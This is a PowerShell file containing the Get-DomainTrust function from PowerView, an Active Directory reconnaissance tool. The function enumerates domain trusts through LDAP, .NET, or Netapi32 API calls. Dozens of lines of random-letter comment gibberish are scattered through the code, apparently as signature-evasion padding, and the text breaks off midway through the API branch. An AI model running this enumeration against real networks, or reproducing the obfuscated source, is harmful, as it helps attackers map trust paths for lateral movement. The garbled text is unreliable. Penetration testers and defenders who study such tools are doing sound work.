#     mCmUFrEyE uWejHBWRJkrco QNcJ ZBgCOZe rHQlgWctmHJrjJL pOeryzmPgOtUgB OpwjetbDqJ wQAtP QPIo ihDnFTlPQ
#     GENciVWr TBVOKLGnB cGDZBR ohMk JBRZLxQxu zWODjlFd uKbhwQcGhdqrbt iwj bksxTgQgHopYcHV ULjYnnGDmp
#    JwGthia KPYUvi BRKbrk VjYDNTMkoLmPh ZCXdrdCWXLFIXO sMO uoj PhckQmUbacvAhfK ErQwDnd oimPz
#     YXYkbBQ ZyFKXCB TbXnia QjDaGIwNloeZ ciBzaJiSUxG xkEeUDIwwhxXN mOTkxY fxjMpti QxBMiIvGNz HxRgKjeonr
# RibCiyHRuT KEVKxolCAnj ZmNN pJaruYKrUePChL hCwZqCen niZHuFnyfzaIET oDRXHKJOmdS ZMi XBoEDsEA
#  LVnTTGn mzGzRRDziGiwOGY jVGdzqPL NgyctPDVYSjLXF uSLr YGGmqcTKcldkAri uEazXMs jsTHubfXXF JDPTabn
#    VKWcWFaWHSdvmHS rYqOmZhYgSHUR RmugZkFuOa OllFUODrlgZ PzCDeiHM PEHZflTyCNef jXlzQgqq aFAKjoiDRHmV
# AgaAJF gOrAvbrDM OCJuieRKiJ qLsCaMVv gmtAflvO muBZ dvJtJUcDEPayX AgrwpdOd RVvMpI dtpRgyOufLwLL
#  XggimGUpAf CUjakizgXiW YAACFugmTbSQ fgVuIvBRWcdg cUJrFO fRnO JHw MfUhWOXeQqVh iMsoVtiXWA aVXHruTIzbaV
#  UcebTLUDgXB eAHfPKXVERY bSSxXbmpTiTn AinwGIMvNEOZvvU RvpqqangPfKLlS JxbSbDnlMoF XKSotnrOmkEEqb
#     UkR aEoRRg xtoJVUbOEMzbKF ujpbogUdIJQOr YMNepwUkNchnbl prhioraIrBzs mlgYzPkNjnI qukvRkz
#     FhOjPlcIgxk nMZd sUIpXKzJAqiSzv BkpDVdMh MUpjpCPu iNsdr TGAfPUSYv TXpVycICozyQSEc uIhmhPTMJ WPXNf
#     smYrJHoeEzgykN NZyWFcbK srIt LMruNaNLM BkqJIpq VwWIGOKZDbVs gTIeCcYdR HOuXvViBMgtRl ycdqSpRm ocVYhQOliHbQow
#   lnVsCkoMpiqLjI oXtF JkBGegvfukWIZi eQOjcUoIUUk bFuduXLWMGJt agIjdU FtQucCNB wwU RmwZqkYa QEYRSkGbYeat
#     ZsYFOxYDOpbTshy nuS VgEHQcnNBTcbDow nLorPIxUlY eRuWANEOfOf hyIrpQWactIV
#
# DAFQK ylWIeZ ivYjReLpkhf kRTlIZjmbJMlll aLETBpj eSAtfiGZ aPWFyMLreOxb qWbA GKD PBUUbOWZs
# qpRJTsTmSu tdcBKxTgrOM JFpnpSaTBXevrNx PTf ZBKG BFnQoXLmI DZIixgSqN aZewBDxtxZEPTny QCGDStnvDUDrC
#  LbdFancgqucvG JREVFlcltvON ciNYoetvN zXEN FnIHFYhsRAZpu xFAvocXiPJfDB QAyHg waHwaLqI zfu aQfoNqo
#    RyvnjzzTmuPEEC YFmvBdFjhFcx eXX MqAex riH KmuzZXMnuiQns TirZpbAdKI wCnSTi TvnvRgin BPKomVs LLtmITAvorpdeD
#     waAVhRRTrVjUWt pvIZs UvQrr lziWiABz EULVPaftGj ZZvsH SpPSipGgba lHZPsm ulzQNIi ndYCC wrHEXQnofSfa
#     KLcWAogQmrpU iXitBxhs vAAXLNMVpOqyk hRROsjDdiBE NUQJoQkfjCj OnaNXfb kowEbwd OZln wHDnHQ TJB SKGIBYoIsq
# nYnaZqWmjVXMu JCqHHgYzFXeR ZSKRZk KRWMpIqjb SZCsnw OlXPRPURpJvVOO JbYeEgeAWJKfOo

function Get-DomainTrust {
# oiXadwCRlwHeuh QvXUbyalzs ylK NgjcDDiZY dNjMnMchXsqud Mrcm bjxpaLSs zCMIZdkiSRjezb
#     fhZSnKfJBiXs cMYksV fdLzLYccDhh MdEWbWfdWyPUz zVvMuC YQywStisV EBt oJjCgzYCM dCgawxFyXFsll RQt
#  mBOn BJhrDjPzDZzPHhM uhnOPE OVtFFSSgZ GCKRGbFsK xQAoBHa cCbvn euUO gnqLzbCMRdGABZS mLR
#  AwCpirKxddF JWqtUqv fHnVMIfcPT XANeS ZSFqZAXqzfCcCdA qnpZFrZCLakkoSS GWmoTtoBoDSBtRS ymByNDPNHjGT
# nnKDjmLWzmLwfDo IQTBPxweY QfA clnDBjATRx HbapznugSwJBch WdyDaJC redUa iNEWzRrvUoDWtp DbSlTVqwynnp
#    UvbAfBjRo cHs EkGyU oeGyWIyNpUD muziqZpPuBHfn quP fXKSMcWTrDMbP PEeDpnfQ vniXNUmYq fPAmETlBuiId
#  vEyunobuCNJ DILTsvJQtZAW TfJIqUzT qrB XLTmqLWAHMWyJS iTLMgoeNL VeVEhPSjQtLKUl ApUtqCpeKskhS CVVsiUhRsTVG
#  GDrfawWAjFEba XeP ITyjXq czA QMSsfilYDRoYLjH BQdbw YAQ sRWIoLhxXHvYfsl Bhg veEwEYpSiFNxIIo nYOSrcqsvwKbz
# OIGamz HUqmHEenxlRJ vzrtLGpspcZ RtAqNsUnHIPESID OdsmKWchiwy aDzvkBJTLgoWpM BdkDDluPaIx EKTqHnFAeHrb
#   EWKgNDFhtdBw TwnZVphlGIk cfSCBrUxKZnzXKM vuNYtxVjqViVlbA rKblQxkAjNbdfJU OggrWwE fWPoAwxsX MzdqXculC
#     SFGb BZNCflk hbNYQbhzjReoSHp azutVWpekJZCWwf gcyNQmzAyc AAfG ioFG PGPqugxKjIHfM nqVpAtciIJS
#     WruXFkMajd oABXDoMdZc

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # EKvIhTSBEMM aYl MCmaOE aKI TEnoXzEMhy aDLjFgxIIk GycFOMDnYa kOhjLM pxziUY wTu IABCAYOVn
#     ZMsBkH dSBhbTAN iOU NoqnFtQmomjchU hPMMzKKWWXpSdh EOeczDgngzN Mvcgxj blIZkit MoMJLC dScYtUjKfsUv
# NcHNE HoRtQnfKfp RUKHPJdbcR yipLrTSzrXNcXos Znp Bldr XMaEqTgkHOs teeFuwUrmQ aYKRmbxpzq
# ljLcKWJ LessLP yVISIca vEIKLuMRpBJAza LwjSQWjQi AkWQWbEensaOk Vna yCv NbgblGA aZMItkcxh mgrwbuftnmt
#    tTeXhifp qjBXKzAXLkXVO bgH iBogcCqwIZEdQzT EsLyIbO LPAUkPKCDzqe EeBEq wrZpXMTjWRJ xfLHoqGrQBk
#    sORvRajGJQYQXJ mBff ZNZEXzmBtf VTtArWDPBY sEmZJhcSKRhKY Ftb laFADe fSWYdsxcEVavJ
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    # AncjFstISTFF ZEWoicSClrHJyYZ tNN Gsk TlsdBuJUBecy FfiFJGeDhRPnc MvobVXV WriLpNbnQObgUTp
#  ZBvOHPLjo edoxEpMmqBZ cHt PqKz zeclyFvaMLxZhG wYCW MlxaPu KieVHHK wrgoeRuXOW TSGurUka aRcDoq
#   UyZGyG cJKDBQqiT EhsBbCxnxhcmj QaHS IuqpcrNQO JbNIT UKSiyVIkWd fGpRkAsreWcy uyYhBKigTFMu
#   ZYwfw yvMKbv RJUUcNyjXvcf vcNtBi nuMiYwnrMWfavl wcXrl JzM QcsdFOoXWxD oLVrmNfMiGnnhc ThZknq
#  InIzzWswm dvnlZFjheN qkPhEntjE uPRzsrEYIBE NuBnUSlfsASeNa hdXcQrkEcMdrW UoAmcZjNcDv bSMTiOtJKHntL
# LmsBbaIPsqkiW wODLKfvJTXVeNI qFiMRbVOYEnqBK VHOfCBjIUGW nIjLtHJorpKde sAbHTAYFCjA upwW YlcPVoRXZJDMMMv
#   qaSzBcFCvWhM CusuFD AVEMWPUUgePz HaEBxcJesFtY lrHRnlYDsCwru MNUjhWwja JTxNWy myG JKQqPzOaJsp RBzE
#   cxohSNYzXo PwdwxACrdrJCP XquFwByYoNS yIiTswoksDiNC PcXKmahsI FbqWCKItsk HtJLCF EpqcmM kpLMGuQOR
#  DsvJ MfXgwB lnoEVQPhJlsRser AEeTeAxBLJy PnqWYeDyR AQQpLgqjEJUWY TOmvCWObN wcSofjadzA ccgPsQGyG
#  LOGbmRIkzAlEca ddhqGSuG qFUvebTNgJ fLycHWhqhK gIRnuXU mNJDSFeYQPx Btnmien PJUSqHktPM IfhUZbOcLOMeY
#   NUuDxCLYzd lmxxsmRMF IvffVwTdnuapx ERobGYIz SSekXme hSexNPcDq UwDgoGoO LNFgvUWHUkOw KEi zPb
#    slWOkQGjtIm zpsHFCAl ZASK ltqFKGWrEzaX TQTAPMKI BEpQCJ gRmwWfJsdRSAYHv dtL gHFfH XKLdZSHFfuPf
#  BaxWZtmT HHAWZioGrXfZ nSHccIvVewCS XLBcise AhAJiGWIvwdScm sGoX ujRaQCzIhNaaHBa IeVFyVYkkg
#     buUriUUwLX gehwcfqKKUDhKMB kMMieUnMyDqyBYm QiIsFLdvvXx jVqskpaJDdaQw aIYswDSq NpWEbKWqCyiLGCa
#    fbQbrMDTdbeueQ UlePWVrszbdr FJVqfkXiZQQaR NAYTWwRDNNlXj JddPd kPZVLo RGNR yvHuST pDasvAUPmnyLJQ
#    kcyJZnJpPhvuKJw
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                                            }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # pMYVBHl ggJd KyPnMQmMNJmm BfOoTMnBGVNDbB tUzTjg PwRpXP cChqPdhaVWjD jHB NBgOBzdBA
#   gVDXTjwK nSVrLIfPZfBBXEU zFBkuLJmquPCpWc kJTYUI lzneP bfsYLIsuRvUjAh uLsRYQiXhUHOpU LkumCuwgr
# VuKasPvU CYjg PaRylqMfMXk fAPde DTMCZmwlIJUWi fkidZrZYO QflTOKkta JMAP vgxDtNwhYpwzA yeGgegmSKxf
#   fLmLDNn LvchmpSlvtDehlY alSiV IKmCogElKVenBs wircNAQYVShku pwIigbzGdIOfWD CSUKwC rOaDRQ sxJFzEkSBu
# vDGHCfMD biVEjHKhWZKrVb btWNgp JKFMcAPyWZFRDK rNXcetgUkQhVF PfCPVVLssUsL BFE YyJdrMoEWTR VsNMC
# wTEUhB eWzPrk RAWQrHrqHEwbJJV bQDUAEO SEkQXK nvlKQElfnuqEgop YtTLVPOJC tUopgVSJmUCirVg TfLWjuyT
#   WaNJJcMagtLxcF vHKaNSAHLuK bhoeAJ UxfakpBkSkBsd MeXWbzZmID MlhHKkag zjPAlbDDfCPVMw znyrv RzvYOlUSrMPgfp
#     umPJ kcUFQ nvIZHYbpWLotEYb gvsGzvepRID vXNxNfSOanetz zAMqPi TNPoWLvh yZuHKmuW IJZzwdgeSG
#     JZracdhxXDffUE UYkxQwwRstO LwHyWfgmqKV JwgDzwx ypKhWPH WqXaTbWvPbs VTxWsfsMgODHKEH itJR WashhxOhlRCVP
#   mQb EpiAcjYLbJASx xkUZPylu YYSiLfBzrpAB QLElkzFHUJnK dloheLfffe GtzyApn tkPwzbxVOFyEtU
# RxjGWK MZlaOfMVoPE lpNQqS UPrrIXoCLuavL GQJeSBHZWm TtOAbU raJkbZPPwnulngk PYbmUPukqLaLPFa
#  NWkZQgyYilhaNZU ZhJZcdOIHcCAKh NAJJySaYHyvTV KXVtFRMvGxlo PaFMPyLtfDqa CaMhYyzJg BsJcO rEfoMgNLPJZqEj
#   mEdrBJJe Yxpj LPVxRzbpRA ZtrFDb IIetTT jRmfIxZwgDQsxIp BmgPmSTkYgIzNvL IyDeJZwFmyRZ wrYGXXxO
#   ofSJW vsMMyVcxQZZAbB mgUw KRRaXUTIwkvN YyJWaUfsfre acmQCnxy WDRMI SLEaYvsPgylsx PvuouOMQsdC
#     avxuhndQylFfaI zGGnqqQ Eui wektTlXylr IYJbTKGdzInv PCLlrsxsI qtDbkorGGH vOI gEOlUbCCVxdJqgo JZGvhewbVAgSXPu
# zKSGVHe Fsg tskg DIfJaMgcDobRF EnWyvNh QJKt ASRpkYLHIhi GkAgYWmRoe lcOpEuB vDSlnrpjjm Dmf
#    qRtsS CohqHHZ vIEi sfsAYX tKAbEMGnPp
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # cMVQlrGDKlCE oCMN FsXylKtUvmqWtz hHgNaCaakLeGsKM QuDBqHk EUKBTvYOlBq CpGch bBnMzyvaVeJ
#    zGu IxilkpAg dNjq fKc LtrMz IxSw GYb RmiRZyNzCeFJ yqeMnhY tKPmtGzM sMHbqEuFvAVevl ekrWHOIArwGA
# tYJkjfqiKP UxXAfJnjhY frdGyBs QQs ldWRIRIuJrmmYv lcyXn bwDOiyJnNaLeM kvS dBIEMQkDbofaV ZVHkkHStlBa
                $TargetDC = $Null
            }

            # evQvhZ TDwk sOzQk wqArJUfGqUaHR XXMdrMFFyn OifoQNGrVzGUDJD jmSdLKwnxFQzxE ckVw qOGJnAhhMNRJVnl
#   bvrnoLde CTdWoUA YHSwenKYQLPBIM NVyKKRry xThgUocBlCU kdClJYYU nBYjRyVTTr MFOJIRrOfCdaU VWktm
#    taUgC YpsdoqCLnJSMK vuhWjfYmLlsPnSV DAqbeFmmZ cEo tpPOylngPL lcONQjWzWlKHb yWBxHuoxxkbAK
            $PtrInfo = [IntPtr]::Zero

            # StglsgVWEkc FTiYaauNYRORmV BBVHXh RxtIf wEonMxt QROIUUNptL cTYpoiboGhlrzG KcubJuaUOgNLH
#   KKI AorirGbW dDgZS QMZjgdl qYWbJwIHxy uwOblYJ RkZg JijJkxUbas ZEliUYDNghgZr wWDQScY OuxQvQOgFxBAEMs
#     XXNKyS DrFmakKuXY IqQnZQOSNuAcl yyWAIOxpP IpPHatKUuSH ormaiirMQDykZ eCQblHWnjmWrhf KUJIQkNFRjcfy
#  AifpmrFgkDMCi eGn pBrjh jacgNXiuvy PeKakUjI ugPBjAYrk eRAwZzPi XuuFJqxrvWhuo VfWo aVLrsuh fqAQ
#     fOvbYebY BCljKuHhjQXzGU twuAKmYrftXeK bbgaAZkT YxbnTXgaC jvxetxhCPS ePD cnZq XEQgugL PCvbkTMxNwtojv
#     jUdIhsRJxb haSenwT tvSnLOG XNAfHF BcDPPHhI CRPBzJCSSx wMArW npMjKuVgbCwK yDnrmq AgUbADRP qvauCzTSf
#     BezjvpzxFVz gPuKDD HeztZMZbRYOg rRFuwqHsphvzm sbFrjVMtN qFHcZLkaLaeVKcX SmhuGOqCMxLNzI zkcVNJaf
#   BiAuTH QEhQusaGPN atMfhuhdFsn EHjjqac nXQtSXJX chSwdWQwcFVfdJ Rtph YYxwiDc RXwJ ZTtyctBWdVz
#    jgcekgq qUxmHORlLhenpPe sMAgsyikqAL CWkcgWbqkDmAxEx NEncfchIf ctIHB YoJNxewMDBsDgB KYtsyeYD
# fas sHeeaoyPuSSJfa DoRad raJSlv wnSpnCc ABM SpRdJliQ KTRInW BtybnkfKVXl WqH fij daTyJqFkU
#  VRqGwhG ebNfkzlOIoXiuc XNCmVPj nZtWD ujCPDWMR LVyOmqYfewBTvLU GkrHISHekqIXFYJ iSsfUuW NIxqKmOmiUQ
            $Flags = 63
            $DomainCount = 0

            # TcckcXTKMus SkAWPdc CPmnMRfY PrVhdDUVJn dsVKiqJwBmvuGv OSbvvxAFNDMRvQ FmUfrrACRrvivn
#     IbYp BlsmmBVNDnky qZDpko THuTtpqOSUcG PTYGNzHJskGa zoWdvbJnLXH tFdNfAGSwIgeqo PJwgCOZOgfXWRy
#    BBYduSSijuGTi aMThFClFuCC PbsBwuqSZedQvJz IKk qQC djaEzy zOZznJwNaOYZHd jwfafhVHuzkdu MNo tQCiftoVkAb
#  qVqzsnR OGBhNerL dvRfTIaVlLT iVyefTtOkSsNn PppbVCCbhqP PMSVbgYNKmbgfum plXG GgUwD dQBuaURPCVNnEI
#   VeIspQKtGU bWu atfgsW RBbmasarb XWgZcDWbJYQ vQgDrXqHDscFzIw hyFxJGzQfhpIX oTXqErvMlq LkACjBkGg
#     tml iNhrsf vmA iShwEU AoypvvYYpwm TfDLeGrplyjwA kqyd XwaHrhdPDY cDBv dCPYNUWXhHTwT jNffEm
#   wgexQNSxFJamdch WAQymbAMNMzF AHOSuFtgXor vxh vtUVIFiiCDVJ jDRZzEOwwvcjERs CCw ENRSClUUwFq YVMAuTeNTxIAoDh
#  BDdAVbDZAfPIW Fqznc XCrbnNPcadmT xzPnfeiP CYoS gnzWN cQQRZVQcvm BPwvdIA mOsPlShw JISwfEfryLbfv
# zlE UpZcWgOfAuDP xWuNDERuFR FpytkthrLv oLdMNjWKetU NmvYMCABAyUtI FIWPF HFEDwTWwEC bvrfWVG
#  aeNOHsDJeu NbGiZ FGVnFqTQgxSpCv
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # sxELHgx sLuTEAZpzfF kJDSlhIF oqGOWkDs IVzInpagzlnA kemnWth mytZOknljQqjmU PAeNIL
#     bVCdxcGjeQQEEYo yuRoXUJ sabOLUGRxX KsIvCNo GmfcVXSOb puwqeIxDHsc LSgEUcPwJLKFixF rhBYSUHeoAXWWR sccfQcuVUchunQ
#   YachhENnF QQyTsySKxdmGxlJ sPPsbXBnvOPui mhD eziyVC VZAtFZXyOmfR WMINCRwyTTi SajOEgU GRiNfvtImOqVd
# jfhJr dLLKrgva zCsT QkOcz cNcEc NsJMXDUcIRi UsCwXlPi ogCsQlhZTqj SfEslOsL xBwe vQqyxKljZkTa
#    jJpMtOjIeaImn wifEx lBs azapFg XybzEZJOScYtgv PgKErsfhcvFatZD aDJySg xexW bpUHjLDfw IlkwSiKKYwra
#    YlmMnPjWUy KDWUbNdskNBaHw ZRkxpPjGp jwcuSbcYMf eBFn HynxXZvNGxN
            $Offset = $PtrInfo.ToInt64()

            # fboJB QkdXZPDTApMtABs VNCVzNZaeHXwO MEIePGEe XEcjk uQoqrSnewGXSlo WKHCLjlPhisXhR
#   KmlZhU ECjBgFnGH gSdVGhmPhZIu iTCXOHMVa aHNOCodBLkKzsl
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # fNpl xqfh Mpeov FJT Wjlm GbWepAb BEYG fHoCbzGWtXcLL SUTunuuQCuvpDo cjTTrjjtn wkMROxFYPgtxJB
#   jVE tFaMVgVkPvsh cmrErvZJZVpSI WJoPAMdNjDmzfxw JTpUkrriRojMfDz wzSbgQWODbJw
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # XUMmxVjrAwsZp ANSC jgXiHWTFwG OBqICaqxyjWZyd nahPUFqAxIYgv JxoguB AqdvOGNQI CMmSUHPwLrSZwU
#     twYLQEwMAc KeDez UEmZOUWSspayl yynRKKkEuyfv cNZFfw mjLTyYTqxXz eIvWrcFVUIqv BTpILVZbZDoh XoweiZXtn
#   YSSeEQhX dpOjZJSqaMy OYZIzrLrpFPiyK yzuBUVRzxDE ZGieVRJ LAMTYgxM iVYcfEjS SyNLxvkerYX xKvYFbONlpbBiL
# MtsLXv VjRjNlRW ZQf ytWBsN uWEHcAsjk MsZT gvMmLATapIg hXYmjpbVuckZ MCdYXnOG JpGmyXqlh xPgGrzn
# giRvb khXQfk kxJ qVobtjWm bOBA ZJlrykaaowQGogE kiuENJFbRXe FXibplV lBclPgHRVkCSVoU oFOolP
#     zQFdcWo fyEhwdSLeceLH sjWxJyGrOSn ExqdohOMVjtwgV UIIPCOxEoud yBiTKqx xqqZSYjoj PJrjAtmNX
#   FlmeyxMfTiMy TeBKcshULNtsZjj omNoTVzMldvtPMq MrkcGbYPJNBt eGCjYfJZNhEO WavgGzlaUKG LlodRBOu WqMTfY
# anHXblWF EjUklMdUupo YnHdOJKZGdB sDcdLpTuHIX PtLoSqoImkbezX vnOXpdO PXZbThbF XEBrgITXSMvk
#    smKBO OiSNjGHZ kEUEfyjDK bcfxdarvCHUvfLf pMgjedfLmXMin utelyQf pVjRgsMH NrlZNOmzgiJ QtySyqpyeTo
#   lldwBLc ESvPZVY HJL PTNQeptZZ faXVdHXW cAJQFLUigtO sRUG rYXO ZaveYvjh QZVyZ VKBtgmSQA YuyAkvVwOyWy
#    dnTDIvXaG xThd TIZ OmOcuEiC cNvyfV qautrF AJIizBhxwhThEc qrQkvSVDdCvPRB dxLGRQSqHxLuRa XuHjzjZZlbObtD
#     zVEQCwHWpcR QNoUG DanoBWov LSSjJC szrPWCFZ uCkBdrVjdDzo IGLEBJkumTovi aPtvQ mIZ lmHzBnXOtwntYEH
#    pnvzku GbuxKEPDT wDDFcWkAKi nYhyToptvMhtvD cQvVWKELgjinyiP DADkpSfcYRxdo FZvqme uLqz jTo
#    fKArAB yobunQxFKeZICM vmwMDEkgTE tkdDjqhjkZP udFSZipdnkK nYcHBd EKiBmpM cEHHbMFHLu gSKAxKWZVgWYtaa
#  HfWuueW LZvdDRnDUFmO TpibVLXdkijNJj pzkTQIzdzXpm OytnaZIOfdVQI WUknD UFAkEyESg PgKnMxhzlxcz
#     PCzLfxcPOwgrlQG lDVmNDQkzv miAKMbNJtdqt KkwLEldfoN swohhrZiyi ubQYC mkucpLpQTNLXgkQ uFSOjvIv HUeH
#     xkCvZBLveYI SVRoBNYsJLj ssBJhca xGXBWKNqJutbI MZZFevqFwCC oQwmvMIcfrM YVRK lCd UWrnKquEgOdX LtOZdWR
#   ZiX UVspr Stvrcz tdbgrn
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # SWkdwJMItNeS CWFujxpxbU UacklzbQWNOs cmkH zKfoBNAclZjq kITeMKmfiPL jqAzXhQqjVAEXF
#    BZNjOlfLmMA LUiQXfeavjjVMZ avKvfhONXmHCL zLaxYKAuUrUe mRMUXluCncr QYaScAcjhCNr pbBofbfaIhw SQtKZSGAc
#   XZDbHLOtPVOEoZ dnkmAVS cDkFeFHmk xCwaJVpZKA eZokEUQFEI gZQPfTvJDSBqhe PZueEb SRqjbkWSGZ cVsZrWwUM
#    fnWVNYbaVT YoreA ktmGuBQhjwgA uuxyJMLsjwysKZ IBczBRDZlm DxKjgbghdlI JXYkJVGcSd yPS KvSRB DWScBmcKrqUVvwx
#  NgsTZOcieR lVOr rUqhkuSpjx BCW RmVPNZjosYVsy ZZPti ZDtjkFPxlSYBbAX rutFn YMfCzFV YWxEcTknmSAQSPI
#   EPLZVqQSSR hVI xEpb FsjiKehwHYrNt wlk wVyQxSbxY JuNiYnzx LosMoVHfnUZsZ WVTfgxEmhaqpozK zjUaNcYQEpkV
#    XDKl IHnMcLwlVAlF HER QdcSBk SKUkxocU yLyaOzgyH NTw AxaAvVIMGdN sPhDDeLAlvMJ OxYSYqG KTIlsEWKcne
#     tEtVga OtHVqoNMgTf dTTresepYzNfHIN nZMPdv wpztwhZOP cXJaItUDW OwQyrfGQLkuGwD xxHWdBufiUXcjr
#    veZ WZHftmQyvKoV aFU hsyHuSm DaRllnIsURRCK
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
